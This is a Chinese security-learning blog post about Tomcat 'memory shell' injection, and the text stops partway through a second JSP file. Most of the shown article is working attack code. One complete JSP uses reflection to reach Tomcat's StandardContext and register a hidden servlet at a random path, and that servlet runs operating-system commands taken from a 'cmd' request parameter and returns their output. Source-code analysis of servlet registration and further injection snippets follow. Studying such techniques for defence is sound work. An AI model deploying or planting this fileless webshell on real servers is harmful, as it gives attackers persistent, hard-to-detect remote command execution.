<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>传统web应用型内存马 | clown</title><meta name="author" content="clown"><meta name="copyright" content="clown"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这里是本菜鸡开始学习内存马的起始文章 有关内存马的认知可以看看su18师傅的这篇文章：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;NKq4BZ8fLK7bsGSK5UhoGQ 有关tomcat源码分析的文章：Tomcat源码初识一 Tomcat整理流程图_tomcat流程图-CSDN博客 然后这里有一篇总结得特别全得内存马文章：https:&#x2F;&#x2F;paper.seebug.org&#x2F;3120&#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="传统web应用型内存马">
<meta property="og:url" content="https://clowsman.github.io/2024/09/14/%E4%BC%A0%E7%BB%9Fweb%E5%BA%94%E7%94%A8%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
<meta property="og:site_name" content="clown">
<meta property="og:description" content="这里是本菜鸡开始学习内存马的起始文章 有关内存马的认知可以看看su18师傅的这篇文章：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;NKq4BZ8fLK7bsGSK5UhoGQ 有关tomcat源码分析的文章：Tomcat源码初识一 Tomcat整理流程图_tomcat流程图-CSDN博客 然后这里有一篇总结得特别全得内存马文章：https:&#x2F;&#x2F;paper.seebug.org&#x2F;3120&#x2F;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://cdn.clown2024.cn/202407151814129.jpg">
<meta property="article:published_time" content="2024-09-14T14:31:10.000Z">
<meta property="article:modified_time" content="2024-09-20T15:19:53.070Z">
<meta property="article:author" content="clown">
<meta property="article:tag" content="java">
<meta property="article:tag" content="内存马">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://cdn.clown2024.cn/202407151814129.jpg"><link rel="shortcut icon" href="http://cdn.clown2024.cn/202407151818951.jpeg"><link rel="canonical" href="https://clowsman.github.io/2024/09/14/%E4%BC%A0%E7%BB%9Fweb%E5%BA%94%E7%94%A8%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '传统web应用型内存马',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-20 23:19:53'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="clown" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://cdn.clown2024.cn/202407151818951.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">77</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">31</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('http://cdn.clown2024.cn/202407151814129.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="clown"><img class="site-icon" src="https://cdn.clown2024.cn/illust_37614504_20210816_090201.jpg"/><span class="site-name">clown</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">传统web应用型内存马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-14T14:31:10.000Z" title="发表于 2024-09-14 22:31:10">2024-09-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-20T15:19:53.070Z" title="更新于 2024-09-20 23:19:53">2024-09-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java/">java</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="传统web应用型内存马"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>这里是本菜鸡开始学习内存马的起始文章</p>
<p>有关内存马的认知可以看看su18师傅的这篇文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ">https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ</a></p>
<p>有关tomcat源码分析的文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u010883443/article/details/107463782">Tomcat源码初识一 Tomcat整理流程图_tomcat流程图-CSDN博客</a></p>
<p>然后这里有一篇总结得特别全得内存马文章：<a target="_blank" rel="noopener" href="https://paper.seebug.org/3120/">https://paper.seebug.org/3120/</a></p>
<p>这里放一张文章中的源码分析的初始化流程图：</p>
<p><img src="https://cdn.clown2024.cn/202409161536558.png" alt="内存马流程"></p>
<p>做个参考对大致流程有个概念</p>
<blockquote>
<p> 调试的时候我突然发现不应该开启tomcat的自动打开浏览器，这样调试访问前或者访问后的逻辑是才不会那么乱😢</p>
<p> 因为他默认是在我们访问后才会去创建实例</p>
</blockquote>
<h1 id="servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h1><h2 id="简单demo"><a href="#简单demo" class="headerlink" title="简单demo"></a>简单demo</h2><p>先写一个简单的demo然后再分析一下原理吧，先看看效果</p>
<blockquote>
<p>这里用了使用了tomcat8，tomcat10用那个demo有些类找不到</p>
<p>要看源码的话需要导入对应tomcat版本的依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.50<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>这是tomcat的核心依赖，起服务的过程源码基本都在这里</p>
</blockquote>
<p>编写一个servlet内存马的步骤：</p>
<ul>
<li>找到StandardContext</li>
<li>继承并编写一个恶意servlet</li>
<li>创建Wapper对象</li>
<li>设置Servlet的LoadOnStartUp的值</li>
<li>设置Servlet的Name</li>
<li>设置Servlet对应的Class</li>
<li>将Servlet添加到context的children中</li>
<li>将url路径和servlet类做映射</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.Servlet&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletRequest&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletResponse&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;MemoryShellInjectDemo&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        appctx.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletURL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/&quot;</span> + getRandomString();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Servlet&quot;</span> + getRandomString();<br>        <span class="hljs-type">Servlet</span> <span class="hljs-variable">servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Servlet</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> &#123;&#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                &#123;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c &quot;</span> + cmd).getInputStream();<br>                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in, <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                    servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;GBK&quot;</span>);<br>                    <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>                    out.println(output);<br>                    out.flush();<br>                    out.close();<br>                &#125;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>            &#125;<br>        &#125;;<br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>        wrapper.setName(servletName);<br>        wrapper.setServlet(servlet);<br>        wrapper.setServletClass(servlet.getClass().getName());<br>        wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<br>        standardContext.addChild(wrapper);<br>        standardContext.addServletMappingDecoded(servletURL, servletName);<br>        response.getWriter().write(<span class="hljs-string">&quot;[+] Success!!!&lt;br&gt;&lt;br&gt;[*] ServletURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletURL + <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;[*] ServletName:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletName + <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;[*] shellURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://localhost:8080/test&quot;</span> + servletURL + <span class="hljs-string">&quot;?cmd=echo 世界，你好！&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">errorMessage</span> <span class="hljs-operator">=</span> e.getMessage();<br>        response.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">outError</span> <span class="hljs-operator">=</span> response.getWriter();<br>        outError.println(<span class="hljs-string">&quot;Error: &quot;</span> + errorMessage);<br>        outError.flush();<br>        outError.close();<br>    &#125;<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>&lt;%!<br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getRandomString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">characters</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">randomString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) (Math.random() * characters.length());<br>            randomString.append(characters.charAt(index));<br>        &#125;<br>        <span class="hljs-keyword">return</span> randomString.toString();<br>    &#125;<br>%&gt;<br><br></code></pre></td></tr></table></figure>

<p>打入后效果</p>
<p><img src="https://cdn.clown2024.cn/202409161601686.png" alt="image-20240916160158629"></p>
<p>然后就可以去访问对应路由执行命令</p>
<p><img src="https://cdn.clown2024.cn/202409161602929.png" alt="image-20240916160242879"></p>
<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>servlet内存马就是去找到源码中注册servlet的内容，然后我们重复一遍直接注册自己的servlet即可</p>
<p>这里我们是去找源码中如何将web.xml的配置变成servlet的过程</p>
<p>首先找到加载web.xml的ContextConfig#webconfig()</p>
<p><img src="https://cdn.clown2024.cn/202409161629329.png" alt="image-20240916162907251"></p>
<p>然后里面就是读取web.xml的一些代码，重要在第九个步骤</p>
<p><img src="https://cdn.clown2024.cn/202409161630551.png" alt="image-20240916163037486"></p>
<p>这里注释将web.xml应用于Context，调用ContextConfig#configureContext方法</p>
<p>跟进去看一看</p>
<p><img src="https://cdn.clown2024.cn/202409161637697.png" alt="image-20240916163737624"></p>
<p>这里有很多的操作都是通过context加载进去，这里的context就是我们的StandardContext，tomcat每个容器启动时都会通过一个Standard***#startInternal()方法来启动，所以我们具体的context就是StandardContext开始的，我们可以调试看看这个context</p>
<p><img src="https://cdn.clown2024.cn/202409161650754.png" alt="image-20240916165022674"></p>
<p>可以看到是我们的StandardContext，然后这个webxml里面就有解析我们web.xml文件拿到的servlet</p>
<p><img src="https://cdn.clown2024.cn/202409161651016.png" alt="image-20240916165127949"></p>
<p>这个Hello就是我们自己注册的，<strong>所以第一步的找到StandardContext，其实就是获取当前应用的context实例</strong>，然后往里面注册servlet，我们回到configureContext方法继续往下找关键地方</p>
<p><img src="https://cdn.clown2024.cn/202409161658274.png" alt="image-20240916165818197"></p>
<p>这里遍历我们的servlet然后创建wrapper，我们知道wrapper就是用来封装servlet的</p>
<p><img src="https://cdn.clown2024.cn/202409161701466.png" alt="image-20240916170126390"></p>
<p>然后这里的wrapper就是我们知道的tomcat定义的Wrapper的实现类，拿到wrapper之后继续往下，看一下关键的set方法</p>
<p><img src="https://cdn.clown2024.cn/202409161708368.png" alt="image-20240916170822326"></p>
<p>第一步先对loadOnStartup的值进行设置，这个值代表的是Servlet在启动时的加载顺序，如果设置为负数，那么Servlet将在第一次请求时才被加载</p>
<p><img src="https://cdn.clown2024.cn/202409161715978.png" alt="image-20240916171559932"></p>
<p>这一步就是这是servlet的name</p>
<p><img src="https://cdn.clown2024.cn/202409161716418.png" alt="image-20240916171636372"></p>
<p>这一步设置servletClass用的是全类名</p>
<p><img src="https://cdn.clown2024.cn/202409161719067.png" alt="image-20240916171908029"></p>
<p>这一步将前面的wrapper添加到context里面</p>
<p><img src="https://cdn.clown2024.cn/202409161721789.png" alt="image-20240916172036567"></p>
<p>然后这是将前面的servlet遍历完之后，再遍历servletMapping，往context里面添加映射，下面是servletMappings</p>
<p><img src="https://cdn.clown2024.cn/202409161722241.png" alt="image-20240916172220190"></p>
<p>然后这就是整个注册的流程，但是这里并没有实例化我们写的Servlet类，因为它存在懒加载机制，需要我们去访问的时候才会创建实例，但如果我们自己动态在页面写就会走不到那个流程，需要我们直接将实例类放进去</p>
<p>现在知道所有流程我们就可以开始写内存马了，这里是根据组长的流程来写，比较简单</p>
<p>第一步找到standardContext，这也是最关键的一步，因为我们知道jsp里面是有request对象的，我们可以通过request对象来获取standardContext</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>System.out.println(servletContext);<br></code></pre></td></tr></table></figure>

<p>我们先看看request#getServletContext返回的对象</p>
<p><img src="https://cdn.clown2024.cn/202409161746714.png" alt="image-20240916174627626"></p>
<p>我们可以看到往里面第二层的context就是StandardContext，这里我们可以直接用反射来获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1.获取standardContext</span><br>        <span class="hljs-comment">//获取ApplicationContext</span><br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>        <span class="hljs-comment">//获取StandardContext</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br></code></pre></td></tr></table></figure>

<p>然后后面的就比较简单了，按照我们前面分析的注册步骤即可，就是要注意一点我们要手动将servlet实例注册进去</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//2.获取wrapper然后添加</span><br><span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>wrapper.setName(<span class="hljs-string">&quot;TestShell&quot;</span>);<br>wrapper.setServletClass(TestShell.class.getName());<br>   <span class="hljs-comment">//应对懒加载添加我们的实例化servlet</span><br>wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestShell</span>());<br><span class="hljs-comment">//3.将wrapper添加进standardContext</span><br>standardContext.addChild(wrapper);<br><span class="hljs-comment">//4.添加映射</span><br>standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,<span class="hljs-string">&quot;TestShell&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>然后这个servlet我们就简单的弹一个计算器，完整的jsp文件如下</p>
<p>addServlet.jsp</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestShell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            